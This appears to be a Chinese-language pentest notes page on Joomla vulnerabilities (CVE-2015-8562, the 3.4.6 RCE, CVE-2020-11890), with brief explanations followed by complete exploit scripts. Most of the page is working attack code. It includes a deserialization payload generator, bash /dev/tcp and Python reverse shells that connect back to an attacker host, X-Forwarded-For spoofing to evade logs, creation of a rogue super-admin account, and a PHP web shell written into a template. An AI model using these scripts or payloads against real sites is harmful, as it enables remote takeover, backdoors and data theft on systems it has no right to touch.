---
title: Joomla
---

## 应用简介

Joomla是一套全球知名的CMS系统，可以在多种不同的平台上部署并运行

## [CVE-2015-8562]-反序列化RCE

**漏洞概述**

```http
#影响范围
3.4.5
```

本漏洞根源是PHP5.6.13前的版本在读取存储好的session时，如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。

而Joomla将session存储在Mysql数据库中，编码是utf8，当我们插入4字节的utf8数据时则会导致截断。截断后的数据在反序列化时就会失败，最后触发反序列化漏洞

**漏洞利用**

```bash
python CVE-2015-8562.py -t http://<target_ip>/ -l <local_ip> -p <local_port>
```

POC

```python
#!/usr/bin/python

# Exploit Title: Joomla 1.5 - 3.4.5 Object Injection RCE
# Date: 15/09/2017
# Author: Gary@ Sec-1 ltd
# Modified: Andrew McNicol BreakPoint Labs (@0xcc_labs)
# Modified: Paolo Stagno (@Void_Sec) - https://voidsec.com
# Vendor Homepage: https://www.joomla.org/
# Software Link: http://joomlacode.org/gf/project/joomla/frs/
# Version: Joomla 1.5 - 3.4.5
# Tested on: Debian 3.2.89-2 x86_64 GNU/Linux (Joomla! 3.2.1 Stable)
# CVE : CVE-2015-8562

'''
    Blind RCE:
    python joomla-cve-2015-8562.py -t http://192.168.0.1/ --cmd
    $ touch /tmp/test
    Spawn Reverse Shell:
    python joomla-cve-2015-8562.py -t http://192.168.0.1/ -l 192.168.0.2 -p 1337
    [-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: http://192.168.0.1/
    [-] Uploading python reverse shell with LHOST:192.168.1.119 and LPORT:1337
    <Response [200]>
    [+] Spawning reverse shell....
    <Response [200]>
    Listening on [0.0.0.0] (family 0, port 1337)
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
'''

import requests
import subprocess
import argparse
import sys
import base64
import string
import random
import time
import urllib3

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
	return str(''.join(random.choice(chars) for _ in range(size)))

def get_url(url, user_agent, ua_method, proxyDict):
	if ua_method == True :
		# Defaul PoC
		headers = {
		'User-Agent': user_agent
		}
	else:
		# Firefox user_agent and x-forwarded-for method to evade log and lower detection
		headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
		'X-Forwarded-For': user_agent
		}
	try:
		cookies = requests.get(url,headers=headers, proxies=proxyDict, verify=False).cookies
		for _ in range(3):
			response = requests.get(url, headers=headers,cookies=cookies, proxies=proxyDict, verify=False)
		return response
	except requests.exceptions.MissingSchema:
		print "\033[1;31;10m\n[!] Missing http:// or https:// from Target URL\n\033[1;37;10m"
		sys.exit(1)

def php_str_noquotes(data):
	#Convert string to chr(xx).chr(xx) for use in php
	encoded = ""
	for char in data:
		encoded += "chr({0}).".format(ord(char))

	return encoded[:-1]

def generate_payload(php_payload):
	php_payload = "eval({0})".format(php_str_noquotes(php_payload))
	terminate = '\xf0\xfd\xfd\xfd';
	exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
	injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
	exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
	exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

	return exploit_template


def main():
	parser = argparse.ArgumentParser(prog='joomla-cve-2015-8562.py', description='\033[1;37;10mJoomla Object Injection RCE CVE-2015-8652')
	parser.add_argument('-t', dest='RHOST', required=True, help='\033[1;37;10mRemote Target Joomla Server (http://<target ip>)')
	parser.add_argument('-l', dest='LHOST', help='\033[1;37;10mLocal IP for Reverse Shell')
	parser.add_argument('-p', dest='LPORT', help='\033[1;37;10mLocal Port for Reverse Shell')
	parser.add_argument('--cmd', dest='cmd', action='store_true', help='\033[1;37;10mDrop into blind RCE')
	parser.add_argument('--u', dest='method', action='store_true', help='\033[1;37;10mSwitch from X-Forwarded-For to User-Agent (less stealthy)')
	parser.add_argument('--b', dest='bash', action='store_true', help='\033[1;37;10mSwitch from Python reverse shell to Bash')
	parser.add_argument('--proxy', dest='proxy', default='None', help='\033[1;37;10mIP of web proxy to go through (http://127.0.0.1:8080)')
	args = parser.parse_args()
	
	if args.proxy is not None:
		proxyDict = { "http"  : args.proxy, "https" : args.proxy }
	else:
		proxyDict = {}
	if args.cmd:
		print "\033[1;37;10m[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}".format(args.RHOST)
		print "\033[1;32;10m[+] Dropping into shell-like environment to perform blind RCE"
		while True:
			command = raw_input('\033[1;37;10m$ ')
			cmd_str = "system('{}');".format(command)
			pl = generate_payload(cmd_str)
			print get_url(args.RHOST, pl, args.method, proxyDict)

	# Spawn Reverse Shell using Netcat listener & Python shell on victim
	elif args.LPORT and args.LPORT:
		shell_name = id_generator()
		connection = "'{}', {}".format(args.LHOST, args.LPORT)
		
		if args.bash == True :
			comm = "bash"
			shell_name = shell_name+".sh"
			# pentestmonkey's Bash reverse shell one-liner:
			str_shell = 'bash -i >& /dev/tcp/{}/{} 0>&1'.format(args.LHOST, args.LPORT)
			payload = '''echo "'''+str_shell+'''" > /tmp/'''+shell_name+''''''
		else :
			comm = "python"
			shell_name = shell_name+".py"
			# pentestmonkey's Python reverse shell one-liner:
			str_shell = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('''+connection+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''
			# Base64 encoded the Python reverse shell as some chars were messing up in the exploit
			encoded_comm = base64.b64encode(str_shell)
			payload = "echo {} | base64 -d > /tmp/{}".format(encoded_comm, shell_name)
		
		print "\033[1;37;10m[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}".format(args.RHOST)
		print "\033[1;32;10m[+] Spawning listener on {}:{}".format(args.LHOST, args.LPORT)		
		listener = subprocess.Popen(args=["gnome-terminal", "--command=nc -lvp "+args.LPORT])
		time.sleep(5)
		print "\033[1;37;10m[-] Uploading reverse shell to /tmp/{}".format(shell_name)
		pl = generate_payload("system('"+payload+"');")
		print get_url(args.RHOST, pl, args.method, proxyDict)
		time.sleep(2)
		print "\033[1;32;10m[+] Spawning reverse shell..."
		print "\033[1;33;10m[-] Check if the listener caught the shell\033[1;37;10m"
		pl = generate_payload("system('{} /tmp/{}');".format(comm, shell_name))
		print get_url(args.RHOST, pl, args.method, proxyDict)
	else:
		print '\033[1;31;10m\n[!] Missing Arguments\n\033[1;37;10m'
		parser.print_help()

if __name__ == "__main__":
	try:
		# Suppress SSL Warning due to unverified HTTPS requests.
		# See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
		urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
		main()
	except KeyboardInterrupt:
		print "\033[1;31;10mQuitting..."
		sys.exit(0)
```

**3.4.6 反序列胡RCE**

下载EXP：https://github.com/momika233/Joomla-3.4.6-RCE

```bash
#漏洞验证
python Joomla-3.4.6-RCE.py -t http://192.168.130.30 (目标靶机ip)

#漏洞利用
python Joomla-3.4.6-RCE.py -t http://192.168.130.30/ --exploit -l 192.168.130.30 -p 6666
```

漏洞执行成功后会在configuration.php中写入随机密码的一句话木马，使用蚁剑连接即可

## [CVE-2020-11890]-后台RCE（需要密码）

```http
Joomla < 3.9.17
```

**漏洞利用**

```bash
python cve202011890.py -url xxx.xxx.xxx.xxx -u username -p pass
```

POC

```python
#!/usr/bin/python
import sys
import requests
import re
import argparse


def extract_token(resp):
    match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
    if match is None:
        print("[-] Cannot find CSRF token!\n")
        return None
    return match.group(1)


def try_admin_login(sess, url, uname, upass):
    admin_url = url + '/administrator/index.php'
    print('[+] Getting token for admin login')
    resp = sess.get(admin_url, verify=True)
    token = extract_token(resp)
    if not token:
        return False
    print('[+] Logging in to admin')
    data = {
        'username': uname,
        'passwd': upass,
        'task': 'login',
        token: '1'
    }
    resp = sess.post(admin_url, data=data, verify=True)
    if 'task=profile.edit' not in resp.text:
        print('[!] Admin Login Failure!')
        return None
    print('[+] Admin Login Successfully!')
    return True


def checkAdmin(url, sess):
    print("[+] Checking admin")
    url_check = url + '/administrator/index.php?option=com_users&view=users'
    resp = sess.get(url_check, verify=True)
    token = extract_token(resp)
    if not token:
        print "[-] You are not administrator!"
        sys.exit()
    return token


def checkSuperAdmin(url, sess):
    print("[+] Checking Superadmin")
    url_check = url + '/administrator/index.php?option=com_config'
    resp = sess.get(url_check, verify=True)
    token = extract_token(resp)
    if not token:
        print "[-] You are not Super-Users!"
        sys.exit()
    return token


def changeGroup(url, sess, token):
    print("[+] Changing group")
    newdata = {
        'jform[title]': 'Public',
        'jform[parent_id]': 100,
        'task': 'group.apply',
        token: 1
    }
    newdata['task'] = 'group.apply'
    resp = sess.post(url + "/administrator/index.php?option=com_users&layout=edit&id=1", data=newdata,
                     verify=True)
    if 'jform[parent_id]' not in resp.text:
        print('[!] Maybe failed to change group...')
        return False
    else:
        print "[+] Done!"
    return True


def create_user(url, sess, username, password, email, token):
    newdata = {
        # Form data
        'jform[name]': username,
        'jform[username]': username,
        'jform[password]': password,
        'jform[password2]': password,
        'jform[email]': email,
        'jform[resetCount]': 0,
        'jform[sendEmail]': 0,
        'jform[block]': 0,
        'jform[requireReset]': 0,
        'jform[id]': 0,
        'jform[groups][]': 8,
        token: 1,
    }
    newdata['task'] = 'user.apply'
    url_post = url + "/administrator/index.php?option=com_users&layout=edit&id=0"
    sess.post(url_post, data=newdata, verify=True)
    sess.get(url + "/administrator/index.php?option=com_login&task=logout&" + token + "=1", verify=True)
    sess = requests.Session()
    if try_admin_login(sess, url, username, password):
        print "[+] Now, you are super-admin!!!!!!!!!!!!!!!!" + "\n[+] Your super-admin account: \n[+] USERNAME: " + username + "\n[+] PASSWORD: " + password + "\n[+] Done!"
    else:
        print "[-] Sorry,exploit fail!"
    return sess


def changeGroupDefault(url, sess, token):
    print("[+] Changing group")
    newdata = {
        'jform[title]': 'Public',
        'jform[parent_id]': 0,
        'task': 'group.apply',
        token: 1
    }
    newdata['task'] = 'group.apply'
    resp = sess.post(url + "/administrator/index.php?option=com_users&layout=edit&id=1", data=newdata,
                     verify=True)
    if 'jform[parent_id]' not in resp.text:
        print('[!] Maybe failed to change group...')
        return False
    else:
        print "[+] Done!"
    return True


def rce(sess, url, cmd, token):
    filename = 'error.php'
    shlink = url + '/administrator/index.php?option=com_templates&view=template&id=506&file=506&file=L2Vycm9yLnBocA%3D%3D'
    shdata_up = {
        'jform[source]': "<?php echo 'Hacked by HK\n' ;system($_GET['cmd']); ?>",
        'task': 'template.apply',
        token: '1',
        'jform[extension_id]': '506',
        'jform[filename]': '/' + filename
    }
    sess.post(shlink, data=shdata_up)
    path2shell = '/templates/protostar/error.php?cmd=' + cmd
    # print '[+] Shell is ready to use: ' + str(path2shell)
    print '[+] Checking:'
    shreq = sess.get(url + path2shell)
    shresp = shreq.text
    print shresp + '[+] Shell link: \n' + (url + path2shell)
    print '[+] Module finished.'


def main():
    # Construct the argument parser
    ap = argparse.ArgumentParser()
    # Add the arguments to the parser
    ap.add_argument("-url", "--url", required=True,
                    help=" URL for your Joomla target")
    ap.add_argument("-u", "--username", required=True,
                    help="username")
    ap.add_argument("-p", "--password", required=True,
                    help="password")
    ap.add_argument("-usuper", "--usernamesuper", default="hk",
                    help="Super's username")
    ap.add_argument("-psuper", "--passwordsuper", default="12345678",
                    help="Super's password")
    ap.add_argument("-esuper", "--emailsuper", default="hk@hk.com",
                    help="Super's Email")
    ap.add_argument("-cmd", "--command", default="whoami",
                    help="command")
    args = vars(ap.parse_args())
    # target
    url = format(str(args['url']))
    print '[+] Your target: ' + url
    # username
    uname = format(str(args['username']))
    # password
    upass = format(str(args['password']))
    # command
    command = format(str(args['command']))
    # username of superadmin
    usuper = format(str(args['usernamesuper']))
    # password of superadmin
    psuper = format(str(args['passwordsuper']))
    # email of superadmin
    esuper = format(str(args['emailsuper']))
    # session
    sess = requests.Session()
    if not try_admin_login(sess, url, uname, upass): sys.exit()
    token = checkAdmin(url, sess)
    if not changeGroup(url, sess, token):
        print "[-] Sorry,exploit fail!"
        sys.exit()
    sess = create_user(url, sess, usuper, psuper, esuper, token)
    token = checkSuperAdmin(url, sess)
    # Now you are Super-admin
    if token:
        # call RCE
        changeGroupDefault(url, sess, token)  # easy to view :))
        rce(sess, url, command, token)


if __name__ == "__main__":
    sys.exit(main())
```

